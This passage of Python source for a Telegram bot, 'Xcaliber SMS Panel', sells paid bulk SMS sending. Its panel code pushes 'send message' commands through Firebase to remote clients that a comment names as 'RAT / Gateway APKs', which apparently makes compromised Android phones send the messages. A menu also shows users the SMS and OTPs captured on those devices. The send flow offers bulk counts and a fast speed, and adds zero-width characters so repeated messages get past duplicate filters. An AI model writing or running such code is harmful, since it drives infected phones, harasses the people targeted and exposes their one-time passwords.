                     i+1, panels_to_try, panel["name"], len(try_devices), try_devices[0].get("hb_ts", 0))

            ok, detail, dev_id = self._send_parallel(base_url, try_devices, to, message)
            if ok:
                try:
                    pg.execute_write("UPDATE databases SET sms_sent = sms_sent + 1 WHERE id = %s", (panel["id"],))
                except Exception:
                    pass
                log.info("SEND OK: %s [%s] device=%s", panel["name"], detail, dev_id)
                return True, f"{panel['name']} [{detail}]", dev_id

        log.error("SEND ALL FAIL: to=%s", to)
        return False, "All panels failed", ""

    def send(self, to: str, message: str) -> tuple[bool, str]:
        ok, detail, dev_id = self.send_detail(to, message)
        return ok, detail

    def _send_parallel(self, base_url: str, devices: list, to: str, message: str) -> tuple[bool, str, str]:
        """PUT to devices, then poll for confirmation."""
        sent_devices = []
        for device in devices:
            ok = self._put_sendSms(base_url, device["id"], to, message)
            if ok:
                sent_devices.append(device["id"])

        if not sent_devices:
            return False, "put failed", ""

        for _ in range(3):
            time.sleep(1.5)
            for cid in sent_devices:
                confirmed = self._check_confirmed(base_url, cid)
                if confirmed:
                    return True, "delivered", cid

        return True, "accepted", sent_devices[0]

    def _put_sendSms(self, base_url: str, client_id: str, to: str, message: str) -> bool:
        clean_10 = str(to).strip().replace(" ", "").replace("-", "").lstrip("+")
        if clean_10.startswith("91") and len(clean_10) == 12:
            clean_10 = clean_10[2:]
        plus_10 = "+91" + clean_10 if len(clean_10) == 10 else ("+" + clean_10)
        now_ms = int(time.time() * 1000)

        # Standard SMS payload
        payload_dict = {
            "to": clean_10,
            "number": plus_10,
            "phone": plus_10,
            "phoneNumber": plus_10,
            "mobile": clean_10,
            "mobNo": clean_10,
            "num": clean_10,
            "target": clean_10,
            "message": message,
            "msg": message,
            "text": message,
            "sms": message,
            "messageText": message,
            "from": 1,
            "fromSlot": 1,
            "sim": 1,
            "simSlot": "0",
            "isSended": False,
            "isSent": False,
            "status": "pending",
            "time": int(time.time()),
            "timestamp": now_ms
        }
        payload_bytes = json.dumps(payload_dict).encode("utf-8")

        # Action-style payload for RAT / Gateway APKs
        action_dict = {
            "action": "send message",
            "command": "send message",
            "message": message,
            "messageText": message,
            "phoneNumber": clean_10,
            "number": plus_10,
            "phone": plus_10,
            "to": plus_10,
            "simSlot": "0",
            "status": "pending",
            "timestamp": now_ms,
            "targetDeviceId": client_id,
            "sendSms": {
                "message": message,
                "number": plus_10,
                "phone": plus_10,
                "status": "pending",
                "timestamp": now_ms,
                "to": clean_10
            }
        }
        action_bytes = json.dumps(action_dict).encode("utf-8")

        success = False

        # 1. POST (Firebase Push) to trigger ChildEventListener (onChildAdded)
        post_targets = [
            (f"clients/{client_id}/sendSms", payload_bytes),
            (f"clients/{client_id}/action", action_bytes),
        ]
        for node, p_bytes in post_targets:
            url = _firebase_url(base_url, node)
            try:
                req = urllib.request.Request(url, data=p_bytes, headers={"Content-Type": "application/json"}, method="POST")
                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status in (200, 201, 202):
                        success = True
            except Exception:
                pass

        # 2. PUT to trigger ValueEventListener (onDataChange) and direct property listeners
        put_targets = [
            (f"clients/{client_id}/webhookEvent/sendSms", payload_bytes),
            (f"clients/{client_id}/sendSms", payload_bytes),
            (f"clients/{client_id}/action", action_bytes),
            (f"clients/{client_id}/command", action_bytes),
            (f"clients/{client_id}/send_sms", payload_bytes),
            (f"clients/{client_id}/sms", payload_bytes),
            (f"clients/{client_id}/smsCommand", payload_bytes),
            (f"clients/{client_id}/commands", payload_bytes)
        ]
        for node, p_bytes in put_targets:
            url = _firebase_url(base_url, node)
            try:
                req = urllib.request.Request(url, data=p_bytes, headers={"Content-Type": "application/json"}, method="PUT")
                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status in (200, 201, 202):
                        success = True
            except Exception:
                pass

        return success



    def _check_confirmed(self, base_url: str, client_id: str) -> bool:

        check_url = _firebase_url(base_url, f"clients/{client_id}/webhookEvent/sendSms")

        try:

            data = _firebase_get(check_url, timeout=5)

            if isinstance(data, dict):

                is_sent = data.get("isSended")

                if is_sent is True or (is_sent and is_sent != False):

                    return True

        except Exception:

            pass

        return False





# ─── HELPER FUNCTIONS  ────────────────────────────────────────────────────





def is_admin(uid: int) -> bool:

    return uid in ADMIN_IDS





def main_menu_markup():

    return InlineKeyboardMarkup(get_main_menu())





def back_markup():

    return InlineKeyboardMarkup(BACK_BTN)





def fmt_phone_display(phone: str) -> str:

    if phone.startswith("91") and len(phone) == 12:

        return f"+91 {phone[2:7]} {phone[7:]}"

    return phone





def fmt_balance(user: dict) -> str:

    return f"💰 Wallet: ₹{user.get('balance', 0):.2f}\n📱 SMS Sent: {user.get('sms_sent', 0)}"





def menu_header(user: dict) -> str:

    return (

        "╔════════════════════╗\n"

        "   Xcaliber SMS Panel\n"

        "╚════════════════════╝\n\n"

        f"💰 Balance: ₹{user.get('balance', 0):.2f}\n"

        f"📱 SMS Sent: {user.get('sms_sent', 0)}\n\n"

        "Select an option:"

    )





async def notify_admin(text: str):

    chat_id = settings_cache.get("telegram_chat_id")

    if not chat_id:

        return

    token = settings_cache.get("bot_token") or BOT_TOKEN

    if not token:

        return

    try:

        url = f"https://api.telegram.org/bot{token}/sendMessage"

        data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:

            async with session.post(url, json=data) as resp:

                return resp.status == 200

    except Exception:

        return False





# ─── HANDLERS  ────────────────────────────────────────────────────────────





async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    tg = update.effective_user

    name = tg.first_name or ""

    if tg.last_name:

        name = f"{tg.first_name} {tg.last_name}".strip()

    username = tg.username or ""



    # Check if user already exists before get_user creates them

    uid_str = str(tg.id)

    async with pool.acquire() as conn:

        existing = await conn.fetchrow("SELECT user_id FROM users WHERE user_id = $1", uid_str)

    is_new = not existing



    user = await get_user(tg.id, name=name, username=username)

    if user.get("banned"):

        reason = user.get("ban_reason") or "No reason provided"

        await update.message.reply_text(

            f"⛔ You are banned.\n\nReason: {reason}\n\nContact admin for appeal.",

        )

        return



    signup_bonus = float(settings_cache.get("signup_bonus", "0"))

    referral_bonus = float(settings_cache.get("referral_bonus", "5"))



    # ── SIGNUP BONUS (new users only) ──

    if is_new and signup_bonus > 0:

        await add_balance(tg.id, signup_bonus)



    # ── REFERRAL: /start REF_<referrer_id> ──

    referrer_id = None

    if context.args and context.args[0].startswith("REF_"):

        try:

            referrer_id = int(context.args[0][4:])

        except ValueError:

            referrer_id = None



    if referrer_id and referrer_id != tg.id and referral_bonus > 0:

        if is_new or not user.get("referred_by"):

            await add_balance(referrer_id, referral_bonus)

            async with pool.acquire() as conn:

                await conn.execute(

                    "UPDATE users SET referred_by = $1 WHERE user_id = $2 AND (referred_by IS NULL OR referred_by = '')",

                    str(referrer_id), uid_str,

                )

            await redis_client.delete(f"user:{uid_str}")

            try:

                await context.bot.send_message(

                    chat_id=referrer_id,

                    text=(

                        f"🎉 *Referral Bonus!*\n\n"

                        f"Someone joined using your link!\n"

                        f"💰 +₹{referral_bonus:.2f} added to your balance"

                    ),

                    parse_mode="Markdown",

                )

            except Exception:

                pass



    welcome = settings_cache.get("welcome_message", "Welcome to Xcaliber SMS Service")

    text = (

        f"╔════════════════════╗\n"

        f"   Xcaliber SMS Panel\n"

        f"╚════════════════════╝\n\n"

        f"{welcome}\n\n"

        f"💰 Balance: ₹{user.get('balance', 0):.2f}\n"

        f"📱 SMS Sent: {user.get('sms_sent', 0)}\n\n"

        "Select an option:"

    )

    await update.message.reply_text(text, reply_markup=main_menu_markup())





async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):

    text = (

        "╔════════════════════╗\n"

        "       Help Guide\n"

        "╚════════════════════╝\n\n"

        "📱 *Send SMS:*\n"

        "  1. Click Send SMS\n"

        "  2. Enter 10-digit phone\n"

        "  3. Type your message\n"

        "  4. Pick count\n"

        "  5. Choose speed\n"

        "  6. Confirm & send\n\n"

        "💰 *Balance:* Check your wallet\n"

        "💳 *Topup:* Add funds via UPI\n"

        "🔍 *Verify UTR:* Confirm payment\n"

        "📊 *Stats:* Your activity\n\n"

        f"💲 Cost per SMS: ₹{SMS_COST:.4f}"

    )

    await update.message.reply_text(text, reply_markup=back_markup(), parse_mode="Markdown")





async def cmd_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not is_admin(update.effective_user.id):

        await update.message.reply_text("⛔ Not authorized.")

        return

    status_msg = await update.message.reply_text("🔄 Refreshing all panels...")

    _run_background_probe()

    panel_manager._sync_from_cache()

    working = len(panel_manager.working)

    total = len(panel_manager.panels)

    await status_msg.edit_text(

        f"✅ Panel refresh complete!\n\n"

        f"Working: {working}/{total}\n"

        f"Panels: {', '.join(p['name'] for p in panel_manager.working) or 'None'}"

    )





async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not is_admin(update.effective_user.id):

        await update.message.reply_text("⛔ Not authorized.")

        return

    users = await get_all_users()

    panels = await get_all_panels()

    working = len(panel_manager.working) if panel_manager else 0

    total_sms = await get_total_sms_sent()

    text = (

        "╔════════════════════╗\n"

        "     Admin Panel\n"

        "╚════════════════════╝\n\n"

        f"👥 Users: {len(users)}\n"

        f"📡 Panels: {working}/{len(panels)} online\n"

        f"📱 Total SMS Sent: {total_sms}\n"

        f"💲 SMS Cost: ₹{SMS_COST}"

    )

    kb = [

        [InlineKeyboardButton("📡 Panel Status", callback_data="a_panels")],

        [InlineKeyboardButton("👥 User List", callback_data="a_users")],

        [InlineKeyboardButton("📢 Broadcast", callback_data="a_bcast")],

        [InlineKeyboardButton("🔄 Refresh Panels", callback_data="a_refresh")],

        [InlineKeyboardButton("◀ Back", callback_data="back")],

    ]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))





# ─── CALLBACK HANDLERS  ───────────────────────────────────────────────────





async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    data = query.data

    uid = update.effective_user.id

    chat_id = query.message.chat_id

    tg_user = update.effective_user

    tg_name = f"{tg_user.first_name or ''} {tg_user.last_name or ''}".strip()

    tg_username = tg_user.username or ""



    user_check = await get_user(uid, name=tg_name, username=tg_username)

    if user_check.get("banned"):

        reason = user_check.get("ban_reason") or "No reason provided"

        await query.edit_message_text(f"⛔ You are banned.\n\nReason: {reason}\n\nContact admin for appeal.")

        return



    # ── MAIN MENU ──

    if data == "back":

        states.pop(uid, None)

        user = await get_user(uid, name=tg_name, username=tg_username)

        text = menu_header(user)

        await query.edit_message_text(text, reply_markup=main_menu_markup())

        return



    # ── BALANCE ──

    if data == "balance":

        user = await get_user(uid, name=tg_name, username=tg_username)

        text = (

            "╔════════════════════╗\n"

            "    💰 Your Balance\n"

            "╚════════════════════╝\n\n"

            f"Wallet: ₹{user['balance']:.2f}\n"

            f"📱 SMS Sent: {user['sms_sent']}"

        )

        await query.edit_message_text(text, reply_markup=back_markup())

        return



    # ── REFERRAL ──

    if data == "referral":

        bot_username = context.bot.username

        ref_link = f"https://t.me/{bot_username}?start=REF_{uid}"

        referral_bonus = float(settings_cache.get("referral_bonus", "5"))

        async with pool.acquire() as conn:

            row = await conn.fetchrow(

                "SELECT COUNT(*) AS cnt FROM users WHERE referred_by = $1", str(uid)

            )

        ref_count = row["cnt"] if row else 0

        text = (

            "╔════════════════════╗\n"

            "    🎁 Refer & Earn\n"

            "╚════════════════════╝\n\n"

            f"Share your link with friends!\n\n"

            f"💰 ₹{referral_bonus:.2f} per referral\n"

            f"👥 Your Referrals: {ref_count}\n\n"

            f"Your Link:\n`{ref_link}`"

        )

        await query.edit_message_text(

            text,

            reply_markup=InlineKeyboardMarkup(

                [[InlineKeyboardButton("🔗 Share Link", url=f"https://t.me/share/url?url={ref_link}&text=Join+me+on+SMS+Bot!")],

                 [InlineKeyboardButton("◀ Back", callback_data="back")]]

            ),

            parse_mode="Markdown",

        )

        return



    # ── STATS ──

    if data == "stats":

        user = await get_user(uid, name=tg_name, username=tg_username)

        async with pool.acquire() as conn:

            ref_row = await conn.fetchrow("SELECT COUNT(*) AS cnt FROM users WHERE referred_by = $1", str(uid))

        ref_count = ref_row["cnt"] if ref_row else 0

        text = (

            "╔════════════════════╗\n"

            "     📊 Your Stats\n"

            "╚════════════════════╝\n\n"

            f"User ID: {uid}\n"

            f"Balance: ₹{user['balance']:.2f}\n"

            f"SMS Sent: {user['sms_sent']}\n"

            f"Referrals: {ref_count}\n"

            f"Joined: {user['joined'][:10] if user['joined'] else '-'}\n"

            f"Last Active: {user['last_active'][:16] if user['last_active'] else '-'}"

        )

        await query.edit_message_text(text, reply_markup=back_markup())

        return



    # ── TXN HISTORY ──

    if data == "txn_history":

        uid_str = str(uid)

        async with pool.acquire() as conn:

            rows = await conn.fetch(

                "SELECT target, panel, status, created_at FROM sms_logs WHERE user_id = $1 ORDER BY created_at DESC LIMIT 10",

                uid_str,

            )

        if not rows:

            text = (

                "╔════════════════════╗\n"

                "   📜 Transaction History\n"

                "╚════════════════════╝\n\n"

                "No transactions yet."

            )

        else:

            lines_list = []

            for i, r in enumerate(rows, 1):

                status_icon = "✅" if r["status"] == "sent" else "❌"

                time_str = r["created_at"][:16] if r["created_at"] else "-"

                lines_list.append(f"{i}. {status_icon} {r['target']} | {time_str}")

            text = (

                "╔════════════════════╗\n"

                "   📜 Transaction History\n"

                "╚════════════════════╝\n\n"

                + "\n".join(lines_list)

            )

        await query.edit_message_text(text, reply_markup=back_markup())

        return



    # ── TOPUP ──

    if data == "topup":

        paytm_mid = settings_cache.get("paytm_mid", "N/A")

        paytm_vpa = settings_cache.get("paytm_vpa", "paytm.s2fqznb@pty")

        text = (

            "╔════════════════════╗\n"

            "    💳 Topup Wallet\n"

            "╚════════════════════╝\n\n"

            f"Send payment to:\n\n"

            f"UPI ID: `{paytm_vpa}`\n"

            f"Merchant: `{paytm_mid}`\n\n"

            "Then click *Verify UTR*.\n"

            "Enter any amount."

        )

        kb = [

            [

                InlineKeyboardButton("₹10", callback_data="topup_10"),

                InlineKeyboardButton("₹25", callback_data="topup_25"),

                InlineKeyboardButton("₹50", callback_data="topup_50"),

            ],

            [

                InlineKeyboardButton("₹100", callback_data="topup_100"),

                InlineKeyboardButton("₹200", callback_data="topup_200"),

                InlineKeyboardButton("₹500", callback_data="topup_500"),

            ],

            [InlineKeyboardButton("✏ Custom Amount", callback_data="topup_custom")],

            [InlineKeyboardButton("◀ Back", callback_data="back")],

        ]

        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

        return



    if data.startswith("topup_") and data != "topup_custom":

        amount = float(data.split("_")[1])

        paytm_vpa = settings_cache.get("paytm_vpa", "paytm.s2fqznb@pty")

        text = (

            "╔════════════════════╗\n"

            "   💸 Payment Step\n"

            "╚════════════════════╝\n\n"

            f"Scan QR or send *₹{amount:.2f}* to:\n\n"

            f"UPI ID: `{paytm_vpa}`\n\n"

            "After payment, enter your UTR number below."

        )

        kb = [

            [InlineKeyboardButton("✏ Enter UTR", callback_data="vutr")],

            [InlineKeyboardButton("◀ Back", callback_data="topup")],

        ]

        qr_buf = generate_upi_qr(amount, paytm_vpa)

        await query.message.delete()

        await context.bot.send_photo(

            chat_id=uid,

            photo=qr_buf,

            caption=text,

            reply_markup=InlineKeyboardMarkup(kb),

            parse_mode="Markdown",

        )

        return

        return



    if data == "topup_custom":

        states[uid] = {"step": "topup_amount"}

        await query.edit_message_text(

            "╔════════════════════╗\n"

            "  💳 Custom Topup\n"

            "╚════════════════════╝\n\n"

            "Enter amount in ₹:",

            reply_markup=back_markup(),

        )

        return



    # ── VERIFY UTR ──
    
    if data == "user_received_sms":
        try:
            async with pool.acquire() as conn:
                _db_rows = await conn.fetch(
                    "SELECT from_number, to_number, message, panel, received_at FROM sms_received ORDER BY received_at DESC, id DESC LIMIT 8"
                )
                rows = [dict(r) for r in _db_rows]
        except Exception:
            rows = []
        if not rows:
            text = (
                "\n"
                "📥   *Received SMS / OTPs*\n"
                "\n\n"
                "No incoming SMS received on panels yet.\n"
                "Incoming messages will appear here live when received."
            )
        else:
            text = "\n📥   *Recent Received SMS / OTPs*\n\n\n"
            for r in rows:
                from_num = r.get("from_number") or r.get("number") or "Unknown"
                to_num = r.get("to_number") or "-"
                msg_txt = (r.get("message") or "").strip()
                t_str = (r.get("received_at") or "")[:19]
                text += f"📱 *From:* `{from_num}`  |  *To:* `{to_num}`\n"
                text += f"💬 `{msg_txt}`\n"
                text += f"🕒 _{t_str}_\n\n"
                text += "─────────────────────────\n"

        kb = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="user_received_sms")],
            [InlineKeyboardButton("🔙 Back", callback_data="back")]
        ]
        try:
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        except Exception:
            try:
                await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
            except Exception:
                await context.bot.send_message(chat_id=uid, text=text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        return

    if data == "vutr":
        states[uid] = {"step": "vutr"}
        msg_text = "\n💳   *Verify Payment*\n\n\nEnter your 12-digit Paytm UTR / RRN number:"
        try:
            await query.edit_message_text(msg_text, reply_markup=back_markup(), parse_mode="Markdown")
        except Exception:
            try:
                await query.message.reply_text(msg_text, reply_markup=back_markup(), parse_mode="Markdown")
            except Exception:
                await context.bot.send_message(chat_id=uid, text=msg_text, reply_markup=back_markup(), parse_mode="Markdown")
        return
    # ── SMS FLOW ──

    if data == "sms_start":

        user = await get_user(uid, name=tg_name, username=tg_username)

        if user["balance"] < SMS_COST:

            await query.edit_message_text(

                "╔════════════════════╗\n"

                "  ⚠️ Insufficient Balance\n"

                "╚════════════════════╝\n\n"

                f"Your Balance: ₹{user['balance']:.2f}\n"

                f"Minimum Needed: ₹{SMS_COST:.4f}\n\n"

                "Please top up to continue.",

                reply_markup=InlineKeyboardMarkup([

                    [InlineKeyboardButton("💳 Topup", callback_data="topup")],

                    [InlineKeyboardButton("◀ Back", callback_data="back")],

                ]),

            )

            return

        states[uid] = {"step": "phone"}

        await query.edit_message_text(

            "╔════════════════════╗\n"

            "  📱 Step 1: Phone\n"

            "╚════════════════════╝\n\n"

            "Enter 10-digit phone number:",

            reply_markup=back_markup(),

        )

        return



    # ── COUNT SELECTION ──

    if data.startswith("c_"):

        count = int(data.split("_")[1])

        st = states.get(uid, {})

        if st.get("step") != "cnt":

            return

        st["count"] = count

        st["step"] = "speed"

        states[uid] = st



        user = await get_user(uid, name=tg_name, username=tg_username)

        total_cost = count * SMS_COST

        if user["balance"] < total_cost:

            await query.edit_message_text(

                "╔════════════════════╗\n"

                "  ⚠️ Insufficient Balance\n"

                "╚════════════════════╝\n\n"

                f"Need: ₹{total_cost:.2f}\n"

                f"Have: ₹{user['balance']:.2f}\n\n"

                "Please top up.",

                reply_markup=InlineKeyboardMarkup([

                    [InlineKeyboardButton("💳 Topup", callback_data="topup")],

                    [InlineKeyboardButton("◀ Back", callback_data="back")],

                ]),

            )

            states.pop(uid, None)

            return



        phone = st.get("phone", "")

        msg = st.get("message", "")

        display_phone = fmt_phone_display(phone)

        text = (

            "╔════════════════════╗\n"

            "  📱 Step 4: Speed\n"

            "╚════════════════════╝\n\n"

            f"Phone: {display_phone}\n"

            f"Message: {msg[:80]}{'...' if len(msg) > 80 else ''}\n"

            f"Count: {count}\n"

            f"💰 Cost: ₹{total_cost:.4f}\n\n"

            "Select speed:"

        )

        kb = [

            [

                InlineKeyboardButton("⚡ Fast (0.1s)", callback_data="speed_fast"),

                InlineKeyboardButton("🐢 Slow (2s)", callback_data="speed_slow"),

            ],

            [InlineKeyboardButton("◀ Back", callback_data="sms_start")],

        ]

        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

        return



    # ── SPEED SELECTION ──

    if data.startswith("speed_"):

        speed = 0.1 if data == "speed_fast" else 2.0

        st = states.get(uid, {})

        if st.get("step") != "speed":

            return

        st["speed"] = speed

        st["step"] = "confirm"

        states[uid] = st



        phone = st.get("phone", "")

        msg = st.get("message", "")

        count = st.get("count", 1)

        total_cost = count * SMS_COST

        speed_label = "Fast ⚡" if speed == 0.1 else "Slow 🐢"

        display_phone = fmt_phone_display(phone)



        text = (

            "╔════════════════════╗\n"

            "  ✅ Step 5: Confirm\n"

            "╚════════════════════╝\n\n"

            f"📱 Phone: {display_phone}\n"

            f"💬 Message: {msg[:100]}{'...' if len(msg) > 100 else ''}\n"

            f"🔢 Count: {count}\n"

            f"🚀 Speed: {speed_label}\n"

            f"💰 Cost: ₹{total_cost:.4f}\n\n"

            "Proceed?"

        )

        kb = [

            [InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"), InlineKeyboardButton("❌ Cancel", callback_data="back")],

        ]

        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

        return



    # ── CONFIRM ──

    if data == "confirm_yes":
        st = states.get(uid, {})
        if st.get("step") != "confirm":
            return
        phone = st["phone"]
        msg = st["message"]
        count = st["count"]
        speed = st.get("speed", 0.1)
        total_cost = count * SMS_COST

        user = await get_user(uid, name=tg_name, username=tg_username)
        if user["balance"] < total_cost:
            await query.edit_message_text(
                "\n   *Insufficient Balance*\n\n\n" +
                f"Need: {total_cost:.2f}\nAvailable: {user['balance']:.2f}\n\nPlease top up your wallet.",
                reply_markup=back_markup(),
                parse_mode="Markdown"
            )
            states.pop(uid, None)
            return

        ok = await deduct_balance(uid, total_cost)
        if not ok:
            await query.edit_message_text(
                "\n   *Deduction Failed*\n\n\nCould not deduct balance. Please try again.",
                reply_markup=back_markup(),
                parse_mode="Markdown"
            )
            states.pop(uid, None)
            return

        await query.edit_message_text(
            f"\n   *Sending SMS...*\n\n\nTarget: `{fmt_phone_display(phone)}`\nTotal: {count}\n\nDispatching messages...",
            parse_mode="Markdown"
        )

        sent = 0
        failed = 0

        try:
            for i in range(count):
                unique_msg = msg + ("\u200b" * (i % 20))
                ok_res, detail, dev_id = await panel_manager.send_async(phone, unique_msg)
                if ok_res:
                    sent += 1
                    await increment_sms(uid)
                    await log_sms(str(uid), phone, detail, "sent", msg)
                else:
                    failed += 1
                    await log_sms(str(uid), phone, "none", "failed", detail)

                if i < count - 1:
                    wait_time = max(speed, 0.8) if speed == 0.1 else speed
                    await asyncio.sleep(wait_time)

                if (i + 1) % 5 == 0 or (i + 1) == count:
                    pct = ((i + 1) / count) * 100
                    try:
                        await context.bot.edit_message_text(
                            f"\n   *Sending SMS...*\n\n\nProgress: {i + 1}/{count} ({pct:.0f}%)\n Sent: {sent}\n Failed: {failed}",
                            chat_id=chat_id,
                            message_id=query.message.message_id,
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass
        finally:
            # Production-grade refund: any unprocessed or failed messages are guaranteed refunded
            unprocessed = max(0, count - (sent + failed))
            total_failed = failed + unprocessed
            if total_failed > 0:
                refund_amount = round(total_failed * SMS_COST, 4)
                await add_balance(uid, refund_amount)
                log.info("Auto-refunded %.4f to user %s for %d failed/unprocessed SMS", refund_amount, uid, total_failed)

        final_user = await get_user(uid, name=tg_name, username=tg_username)
        text = (
            "\n" +
            "   *SMS Complete!*\n\n\n" +
            f" Target: `{fmt_phone_display(phone)}`\n" +
            f" Sent: *{sent}* / {count}\n" +
            f" Failed: *{failed}*\n" +
            f" Total Cost: *{((sent * SMS_COST)):.4f}*\n" +
            f" Remaining Balance: *{final_user['balance']:.2f}*\n\n" +
            ("Auto-refunded failed SMS amount to balance.\n" if failed > 0 else "All messages dispatched successfully!")
        )
        kb = [[InlineKeyboardButton("⚡ Send More", callback_data="sms_start")], [InlineKeyboardButton("🔙 Main Menu", callback_data="back")]]
        try:
            await context.bot.edit_message_text(text, chat_id=chat_id, message_id=query.message.message_id, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        except Exception:
            try:
                await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
            except Exception:
                pass
        states.pop(uid, None)
        return



    # ── ADMIN CALLBACKS ──

    if data == "a_bcast":

        if not is_admin(uid):

            return

        states[uid] = {"step": "a_bcast"}

        await query.edit_message_text(

            "╔════════════════════╗\n"

            "  📢 Broadcast\n"

            "╚════════════════════╝\n\n"

            "Enter broadcast message:",

            reply_markup=back_markup(),

        )

        return



    if data == "a_panels":

        if not is_admin(uid):

            return

        panels = await get_all_panels()

        working = len(panel_manager.working) if panel_manager else 0

        if not panels:

            text = (

                "╔════════════════════╗\n"

                "  📡 Panel Status\n"

                "╚════════════════════╝\n\n"

                "No panels found."

            )

        else:

            lines = [

                "╔════════════════════╗",

                "  📡 Panel Status",

                "╔════════════════════╗\n",

                f"Working: {working}/{len(panels)}\n",

            ]

            for p in panels:

                status = "✅" if any(w["id"] == p["id"] for w in panel_manager.working) else "❌"

                lines.append(f"{status} {p['name']}")

                lines.append(f"   Sent: {p['sms_sent']} | Devices: {p.get('devices_online', 0)}")

            text = "\n".join(lines)

        await query.edit_message_text(text, reply_markup=back_markup())

        return



    if data == "a_refresh":

        if not is_admin(uid):

            return

        await query.edit_message_text("🔄 Refresh panels...")

        _run_background_probe()

        panel_manager._sync_from_cache()

        working = len(panel_manager.working)

        total = len(panel_manager.panels)

        await query.edit_message_text(

            f"✅ Refresh complete!\n\nWorking: {working}/{total}",

            reply_markup=back_markup(),

        )

        return



    if data == "a_users":

        if not is_admin(uid):

            return

        users = await get_all_users()

        total_sms = await get_total_sms_sent()

        lines = [

            "╔════════════════════╗",

            "  👥 User List",

            "╔════════════════════╗\n",

            f"Total Users: {len(users)}\n"

            f"Total SMS Sent: {total_sms}\n",

        ]

        for u in users[:20]:

            lines.append(f"ID: {u['user_id']} | ₹{u['balance']:.2f} | {u['sms_sent']} SMS")

        if len(users) > 20:

            lines.append(f"\n...and {len(users) - 20} more")

        await query.edit_message_text("\n".join(lines), reply_markup=back_markup())

        return





# ─── MESSAGE HANDLER  ─────────────────────────────────────────────────────





async def msg_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    st = states.get(uid)
    tg_user = update.effective_user
    tg_name = f"{tg_user.first_name or ''} {tg_user.last_name or ''}".strip()
    tg_username = tg_user.username or ""

    if not st:
        user_check = await get_user(uid, name=tg_name, username=tg_username)
        if user_check.get("banned"):
            await update.message.reply_text("🚫 You are banned from using this bot.")
            return
        # If user directly sent a UTR number without clicking menu
        clean_cand = text.strip()
        if (clean_cand.isdigit() and len(clean_cand) in range(8, 22)) or (len(clean_cand) in range(8, 22) and not clean_cand.startswith("/") and " " not in clean_cand):
            st = {"step": "vutr"}
            states[uid] = st
        else:
            return

    step = st.get("step")



    # ── PHONE ──

    if step == "phone":

        phone = text.replace(" ", "").replace("-", "").replace("+", "")

        if not phone.isdigit() or len(phone) < 7 or len(phone) > 15:

            await update.message.reply_text(

                "╔════════════════════╗\n"

                "  ⚠️ Invalid Phone\n"

                "╚════════════════════╝\n\n"

                "Enter 10-12 digit phone number:",

                reply_markup=back_markup(),

            )

            return

        if len(phone) == 10:

            phone = "91" + phone

        elif len(phone) == 12 and phone.startswith("91"):

            pass

        else:

            await update.message.reply_text(

                "╔════════════════════╗\n"

                "  ⚠️ Invalid Phone\n"

                "╚════════════════════╝\n\n"

                "Enter 10-12 digit phone number:",

                reply_markup=back_markup(),

            )

            return



        display_phone = fmt_phone_display(phone)

        st["phone"] = phone

        st["step"] = "msg"

        states[uid] = st

        await update.message.reply_text(

            "╔════════════════════╗\n"

            "  💬 Step 2: Message\n"

            "╚════════════════════╝\n\n"

            f"Phone: {display_phone}\n\n"

            "Enter SMS message text:",

            reply_markup=back_markup(),

        )

        return



    # ── MESSAGE ──

    if step == "msg":

        if len(text) < 1:

            await update.message.reply_text(

                "╔════════════════════╗\n"

                "  ⚠️ Empty Message\n"

                "╚════════════════════╝\n\n"

                "Message cannot be empty. Try again:",

                reply_markup=back_markup(),

            )

            return

        st["message"] = text

        st["step"] = "cnt"

        states[uid] = st

        phone = st.get("phone", "")

        display_phone = fmt_phone_display(phone)

        await update.message.reply_text(

            "╔════════════════════╗\n"

            "  🔢 Step 3: Count\n"

            "╚════════════════════╝\n\n"

            f"Phone: {display_phone}\n"

            f"Message: {text[:80]}{'...' if len(text) > 80 else ''}\n\n"

            "Select SMS count:",

            reply_markup=InlineKeyboardMarkup(COUNT_OPTS + [[InlineKeyboardButton("◀ Back", callback_data="back")]]),

        )

        return



    # ── UTR ──
    if step == "vutr":
        clean_utr = text.strip()
        if len(clean_utr) < 6:
            await update.message.reply_text(
                "╔════════════════════╗\n"
                "  ⚠️ Invalid UTR\n"
                "╚════════════════════╝\n\n"
                "UTR number too short. Please enter a valid 12-digit UTR/RRN number:",
                reply_markup=back_markup(),
            )
            return

        wait_msg = await update.message.reply_text(
            "⏳ *Verifying payment with bank...*\nPlease wait a few seconds.",
            parse_mode="Markdown"
        )

        try:
            payment = await asyncio.wait_for(verify_utr(clean_utr), timeout=25.0)
        except asyncio.TimeoutError:
            log.warning("verify_utr timed out for UTR %s", clean_utr)
            payment = None
        except Exception as e:
            log.error("verify_utr exception for %s: %s", clean_utr, e)
            payment = None

        if not payment:
            states.pop(uid, None)
            try:
                await wait_msg.edit_text(
                    "╔════════════════════╗\n"
                    "  ❌ UTR Not Found\n"
                    "╚════════════════════╝\n\n"
                    f"No successful payment found for UTR: `{clean_utr}`.\n\n"
                    "📌 *Please make sure:*\n"
                    "1. You completed the UPI payment successfully.\n"
                    "2. You entered the correct 12-digit UTR/RRN number.\n"
                    "3. If paid just now, wait 30-60 seconds and try again.\n\n"
